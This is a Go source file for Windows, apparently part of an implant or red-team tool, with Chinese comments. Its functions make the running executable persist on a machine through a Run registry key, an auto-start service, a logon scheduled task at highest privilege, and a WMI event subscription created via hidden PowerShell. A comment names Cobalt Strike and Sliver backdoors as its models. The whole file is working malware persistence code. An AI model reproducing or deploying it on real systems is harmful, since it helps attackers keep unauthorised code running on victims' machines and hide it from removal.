//go:build windows && amd64

package persist

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"unsafe"
)

var (
	advapi32             = syscall.NewLazyDLL("advapi32.dll")
	procRegOpenKeyEx     = advapi32.NewProc("RegOpenKeyExW")
	procRegSetValueEx    = advapi32.NewProc("RegSetValueExW")
	procRegDeleteValue   = advapi32.NewProc("RegDeleteValueW")
	procRegCloseKey      = advapi32.NewProc("RegCloseKey")
	procCreateService    = advapi32.NewProc("CreateServiceW")
	procOpenSCManager    = advapi32.NewProc("OpenSCManagerW")
	procCloseService     = advapi32.NewProc("CloseServiceHandle")
	procDeleteService    = advapi32.NewProc("DeleteService")
	procStartService     = advapi32.NewProc("StartServiceW")
)

const (
	HKEY_CURRENT_USER = 0x80000001
	KEY_ALL_ACCESS    = 0xF003F
	REG_SZ            = 1
)

// PersistMethod 定义了持久化方法。
type PersistMethod string

const (
	MethodRegistry    PersistMethod = "registry"
	MethodService     PersistMethod = "service"
	MethodSchTasks    PersistMethod = "schtasks"
	MethodWMIEvent    PersistMethod = "wmi_event"
)

// PersistConfig 是持久化配置。
type PersistConfig struct {
	Name        string // 注册表值名/服务名/任务名
	DisplayName string // 服务显示名
	BinaryPath  string // 可执行文件路径
	Description string // 服务描述
}

// Install 安装持久化。
func (c *PersistConfig) Install(method PersistMethod) error {
	if c.BinaryPath == "" {
		path, err := os.Executable()
		if err != nil {
			return fmt.Errorf("get executable path: %w", err)
		}
		c.BinaryPath = path
	}
	switch method {
	case MethodRegistry:
		return c.installRegistry()
	case MethodService:
		return c.installService()
	case MethodSchTasks:
		return c.installScheduledTask()
	case MethodWMIEvent:
		return c.installWMIEvent()
	default:
		return fmt.Errorf("unknown persist method: %s", method)
	}
}

// Remove 移除持久化。
func (c *PersistConfig) Remove(method PersistMethod) error {
	switch method {
	case MethodRegistry:
		return c.removeRegistry()
	case MethodService:
		return c.removeService()
	case MethodSchTasks:
		return c.removeScheduledTask()
	case MethodWMIEvent:
		return c.removeWMIEvent()
	default:
		return fmt.Errorf("unknown persist method: %s", method)
	}
}

// --- Registry ---

func (c *PersistConfig) installRegistry() error {
	var hKey syscall.Handle
	r, _, err := procRegOpenKeyEx.Call(
		uintptr(HKEY_CURRENT_USER),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`))),
		0,
		uintptr(KEY_ALL_ACCESS),
		uintptr(unsafe.Pointer(&hKey)),
	)
	if r != 0 {
		return fmt.Errorf("RegOpenKeyEx: %w", err)
	}
	defer procRegCloseKey.Call(uintptr(hKey))

	valuePtr := syscall.StringToUTF16Ptr(c.Name)
	dataPtr := syscall.StringToUTF16Ptr(c.BinaryPath)
	r, _, err = procRegSetValueEx.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(valuePtr)),
		0,
		uintptr(REG_SZ),
		uintptr(unsafe.Pointer(dataPtr)),
		uintptr((len(c.BinaryPath)+1)*2),
	)
	if r != 0 {
		return fmt.Errorf("RegSetValueEx: %w", err)
	}
	return nil
}

func (c *PersistConfig) removeRegistry() error {
	var hKey syscall.Handle
	r, _, err := procRegOpenKeyEx.Call(
		uintptr(HKEY_CURRENT_USER),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`))),
		0,
		uintptr(KEY_ALL_ACCESS),
		uintptr(unsafe.Pointer(&hKey)),
	)
	if r != 0 {
		return fmt.Errorf("RegOpenKeyEx: %w", err)
	}
	defer procRegCloseKey.Call(uintptr(hKey))

	valuePtr := syscall.StringToUTF16Ptr(c.Name)
	r, _, err = procRegDeleteValue.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(valuePtr)),
	)
	if r != 0 {
		return fmt.Errorf("RegDeleteValue: %w", err)
	}
	return nil
}

// --- Service ---

const (
	SERVICE_WIN32_OWN_PROCESS = 0x00000010
	SERVICE_AUTO_START        = 0x00000002
	SERVICE_ERROR_NORMAL      = 0x00000001
	SERVICE_ALL_ACCESS        = 0xF01FF
	SC_MANAGER_ALL_ACCESS     = 0xF003F
)

func (c *PersistConfig) installService() error {
	scmPtr, _ := syscall.UTF16PtrFromString("")
	r, _, err := procOpenSCManager.Call(
		uintptr(unsafe.Pointer(scmPtr)),
		0,
		uintptr(SC_MANAGER_ALL_ACCESS),
	)
	if r == 0 {
		return fmt.Errorf("OpenSCManager: %w", err)
	}
	scm := syscall.Handle(r)
	defer procCloseService.Call(uintptr(scm))

	namePtr, _ := syscall.UTF16PtrFromString(c.Name)
	displayPtr, _ := syscall.UTF16PtrFromString(c.DisplayName)
	binPtr, _ := syscall.UTF16PtrFromString(c.BinaryPath)

	r, _, err = procCreateService.Call(
		uintptr(scm),
		uintptr(unsafe.Pointer(namePtr)),
		uintptr(unsafe.Pointer(displayPtr)),
		uintptr(SERVICE_ALL_ACCESS),
		uintptr(SERVICE_WIN32_OWN_PROCESS),
		uintptr(SERVICE_AUTO_START),
		uintptr(SERVICE_ERROR_NORMAL),
		uintptr(unsafe.Pointer(binPtr)),
		0, // lpLoadOrderGroup
		0, // lpdwTagId
		0, // lpDependencies
		0, // lpServiceStartName
		0, // lpPassword
	)
	if r == 0 {
		return fmt.Errorf("CreateService: %w", err)
	}
	svc := syscall.Handle(r)
	defer procCloseService.Call(uintptr(svc))

	// Start the service
	r, _, err = procStartService.Call(uintptr(svc))
	if r == 0 {
		return fmt.Errorf("StartService: %w", err)
	}
	return nil
}

func (c *PersistConfig) removeService() error {
	scmPtr, _ := syscall.UTF16PtrFromString("")
	r, _, err := procOpenSCManager.Call(
		uintptr(unsafe.Pointer(scmPtr)),
		0,
		uintptr(SC_MANAGER_ALL_ACCESS),
	)
	if r == 0 {
		return fmt.Errorf("OpenSCManager: %w", err)
	}
	scm := syscall.Handle(r)
	defer procCloseService.Call(uintptr(scm))

	// OpenService (not OpenSCManager again)
	svc, _, err := syscall.NewLazyDLL("advapi32.dll").NewProc("OpenServiceW").Call(
		uintptr(scm),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(c.Name))),
		uintptr(SERVICE_ALL_ACCESS),
	)
	if svc == 0 {
		return fmt.Errorf("OpenService: %w", err)
	}
	defer procCloseService.Call(uintptr(svc))

	r, _, err = procDeleteService.Call(uintptr(svc))
	if r == 0 {
		return fmt.Errorf("DeleteService: %w", err)
	}
	return nil
}

// --- Scheduled Task (falls back to schtasks.exe — COM API is too complex for direct syscall) ---

func (c *PersistConfig) installScheduledTask() error {
	cmd := exec.Command("schtasks", "/Create", "/tn", c.Name,
		"/tr", c.BinaryPath, "/sc", "ONLOGON", "/rl", "HIGHEST", "/f")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("schtasks create: %s", string(out))
	}
	return nil
}

func (c *PersistConfig) removeScheduledTask() error {
	cmd := exec.Command("schtasks", "/Delete", "/tn", c.Name, "/f")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("schtasks delete: %s", string(out))
	}
	return nil
}

// --- WMI Event Persistence ---
// 原理：创建 __EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding
// 当触发条件满足时（如每 60 秒），WMI 自动执行指定命令。
// 参考 Cobalt Strike 的 wmi persistence 和 Sliver 的 backdoor。

func (c *PersistConfig) installWMIEvent() error {
	// Use PowerShell to create WMI permanent event consumer
	psScript := fmt.Sprintf(`
$FilterName = "%s"
$ConsumerName = "%s"
$BinaryPath = "%s"

# Create __EventFilter (triggers every 60 seconds)
$filterArgs = @{
    Name = $FilterName
    EventNamespace = 'root\cimv2'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    QueryLanguage = 'WQL'
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs

# Create CommandLineEventConsumer
$consumerArgs = @{
    Name = $ConsumerName
    CommandLineTemplate = $BinaryPath
    RunInteractively = $false
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

# Create __FilterToConsumerBinding
$bindingArgs = @{
    Filter = [Ref]$filter
    Consumer = [Ref]$consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs | Out-Null
`, c.Name, c.Name, c.BinaryPath)

	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psScript)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("WMI event install: %s", string(out))
	}
	return nil
}

func (c *PersistConfig) removeWMIEvent() error {
	// Remove WMI event binding, filter, and consumer
	psScript := fmt.Sprintf(`
$FilterName = "%s"
$ConsumerName = "%s"

# Remove binding
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Consumer -match $ConsumerName -or $_.Filter -match $FilterName } | Remove-WmiObject

# Remove filter
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$FilterName'" | Remove-WmiObject

# Remove consumer
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'" | Remove-WmiObject
`, c.Name, c.Name)

	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psScript)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("WMI event remove: %s", string(out))
	}
	return nil
}
